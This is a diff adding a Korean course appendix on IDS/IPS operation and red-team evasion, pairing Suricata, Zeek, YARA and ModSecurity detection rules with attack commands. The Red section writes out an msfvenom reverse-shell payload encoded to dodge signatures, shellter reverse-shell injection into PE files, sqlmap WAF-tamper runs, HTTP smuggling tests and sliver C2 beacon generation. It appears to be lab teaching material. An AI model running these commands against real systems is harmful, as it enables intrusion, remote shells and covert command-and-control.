@@ -458,3 +458,161 @@ graph LR
 
 **학생 액션**: lab 시그니처 1개 작성 → dataset 적용.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 07 IDS/IPS + Red 우회)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | Suricata 운영 | suricata + ET Open |
+| s2 | Snort3 비교 | snort3 |
+| s3 | Zeek 프로토콜 분석 | zeek |
+| s4 | 룰 작성 + 검증 | suricata-update + suricata -T |
+| s5 | msfvenom 인코딩 | msfvenom -e shikata_ga_nai |
+| s6 | shellter (PE) | shellter (Wine) |
+| s7 | sqlmap WAF tamper | `sqlmap --tamper=...` |
+| s8 | smuggler (HTTP smuggling) | smuggler.py |
+
+### Blue — IDS/IPS
+
+```bash
+# 환경 (week02 에 이미)
+ssh ccc@10.20.30.1
+sudo apt install -y suricata zeek
+
+# === Suricata 룰셋 강화 ===
+sudo suricata-update enable-source et/open
+sudo suricata-update enable-source ptresearch/attackdetection
+sudo suricata-update enable-source oisf/trafficid
+sudo suricata-update --force                          # 모든 source
+
+sudo systemctl reload suricata
+
+# 룰 통계
+sudo suricatasc -c "ruleset-stats"
+sudo suricatasc -c "ruleset-reload-rules"
+
+# === Zeek (프로토콜 분석) ===
+sudo zeek -i eth0 -e "redef Site::local_nets += { 10.20.30.0/24 };"
+
+# 자동 생성된 log:
+ls /opt/zeek/logs/current/
+# - conn.log (모든 connection)
+# - http.log (HTTP requests)
+# - dns.log (DNS queries)
+# - ssl.log (TLS)
+# - notice.log (suspicious)
+
+# 분석 예시:
+zeek-cut -d ts uid id.orig_h id.resp_h method host uri \
+    < /opt/zeek/logs/current/http.log | head
+
+# === Suricata + Zeek 통합 ===
+# Zeek 의 풍부한 metadata + Suricata 의 시그니처 매칭
+sudo tee /etc/suricata/rules/from-zeek.rules << 'EOF'
+# Zeek notice → Suricata alert 변환
+alert log:notice (msg: "Zeek notice"; sid:1000020;)
+EOF
+```
+
+### Red — IDS 우회 7 기법
+
+```bash
+# === 1. Payload 인코딩 (msfvenom) ===
+msfvenom -p linux/x64/shell_reverse_tcp \
+    LHOST=192.168.0.112 LPORT=4444 \
+    -e x86/shikata_ga_nai -i 10 \
+    -f elf -o /tmp/encoded.elf
+# 인코더 10번 적용 → 시그니처 매칭 회피
+
+# === 2. Polymorphism (shellter) ===
+sudo apt install -y shellter wine
+shellter
+# Auto mode: PE 파일에 reverse shell 자동 주입
+# 매번 다른 변종 → AV/IDS bypass
+
+# === 3. SQLi tamper (sqlmap) ===
+sqlmap -u "http://target/?id=1" \
+    --tamper=between,space2comment,charunicodeencode,equaltolike \
+    --random-agent \
+    --batch
+
+# === 4. WAF 우회 — sqlmap 다중 tamper ===
+sqlmap -u "http://target/?id=1" \
+    --tamper=apostrophemask,base64encode,space2randomblank,unionalltounion,equaltolike,modsecurityzeroversioned \
+    --batch
+
+# === 5. HTTP smuggling (CL.TE / TE.CL) ===
+git clone https://github.com/defparam/smuggler ~/smuggler
+python3 ~/smuggler/smuggler.py -u target.com -m TE.CL
+python3 ~/smuggler/smuggler.py -u target.com -m CL.TE
+
+# === 6. Certificate pinning bypass (mitmproxy) ===
+mitmproxy --mode transparent
+# Mobile app traffic intercept
+
+# === 7. C2 channel — sliver (mTLS) ===
+sliver-server
+> mtls --lhost attacker --lport 443
+# mTLS 으로 자격증명 검증 → 시그니처 매칭 회피
+
+> generate beacon --mtls attacker:443 \
+    --save /tmp/beacon \
+    --evasion        # 자동 인코딩
+```
+
+### Blue — 우회 탐지
+
+```bash
+# === msfvenom 인코더 탐지 ===
+# YARA rule
+sudo tee /etc/yara/msfvenom.yar << 'EOF'
+rule shikata_ga_nai_encoder
+{
+    strings:
+        $a = { d9 ee d9 74 24 f4 5b 81 73 13 ?? ?? ?? ?? }    // shikata signature
+    condition:
+        $a
+}
+EOF
+
+# 파일 검사
+yara /etc/yara/msfvenom.yar /tmp/encoded.elf
+# → 매칭됨 (encoder signature)
+
+# === SQLi tamper 탐지 (ModSec) ===
+# OWASP CRS rule 942100 시리즈가 다양한 인코딩 패턴 매칭
+# Strict mode (paranoia level 4) 활성:
+echo 'SecAction "id:9001,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=4"' | \
+    sudo tee /etc/modsecurity/custom-strict.conf
+
+# === HTTP smuggling 탐지 ===
+# Zeek http.log 의 비정상 Content-Length 감지
+zeek-cut -d ts host uri request_body_len < http.log | \
+    awk '$NF > 100000 {print}'                        # 100KB+ body
+
+# === sliver C2 mTLS 탐지 ===
+# Suricata TLS fingerprint
+sudo tee /etc/suricata/rules/sliver-c2.rules << 'EOF'
+alert tls any any -> any any (msg:"sliver C2 TLS pattern"; \
+    flow:established,to_server; \
+    tls.cert_subject; content:"O=Internet Widgits"; \
+    sid:1000030;)
+EOF
+```
+
+### 우회 / 탐지 매트릭스
+
+| 우회 기법 | 효과 | 탐지 도구 |
+|----------|------|----------|
+| msfvenom encoder | 약함 (YARA 매칭) | YARA + ClamAV |
+| Polymorphism (shellter) | 강함 | EDR runtime + Falco |
+| sqlmap tamper | 약함 (CRS strict) | ModSec paranoia 4 |
+| HTTP smuggling | 매우 강함 | Zeek http length anomaly |
+| TLS C2 | 강함 | Suricata cert fingerprint + JA3 |
+| DNS C2 | 매우 강함 | Suricata DNS length + Zeek |
+
+학생은 본 7주차에서 **Blue (Suricata + Zeek + ModSec strict + YARA) ↔ Red (msfvenom + shellter + sqlmap tamper + smuggler + sliver)** 의 IDS 우회 공방을 익힌다.
